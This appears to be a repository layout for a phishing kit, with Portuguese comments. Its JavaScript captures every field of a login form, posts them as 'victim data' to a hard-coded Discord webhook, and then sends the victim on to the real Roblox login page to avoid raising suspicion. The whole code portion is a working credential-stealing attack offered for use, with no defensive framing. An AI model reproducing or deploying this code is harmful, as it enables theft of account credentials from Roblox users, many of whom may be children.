/ (raiz do repositório)
├── index.html
document.addEventListener('DOMContentLoaded', () => {
    const form = document.querySelector('form');
    const webhookURL = 'https://discord.com/api/webhooks/1559620080118272010/Gq-CtSMlCnFbvzLJ8cukyGFKYDYBwVI-fWcy2P3Hfe7k7zKusFieTlaK0LUbEd2BeE_9';

    if (form) {
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const formData = new FormData(form);
            const data = {};
            formData.forEach((value, key) => {
                data[key] = value;
            });

            const payload = {
                content: '🚀 **Novo Login Capturado!**',
                embeds: [{
                    title: 'Dados da Vítima',
                    color: 16711680,
                    fields: Object.entries(data).map(([key, value]) => ({
                        name: key.toUpperCase(),
                        value: value,
                        inline: true
                    }))
                }]
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error('Erro ao enviar:', err);
            }

            // Redireciona para o site oficial para não levantar suspeitas
            window.location.href = 'https://www.roblox.com/login';
        });
    }
});
├── css/
│   └── style.css
├── js/
│   └── main.js
└── img/
    └── logo.png
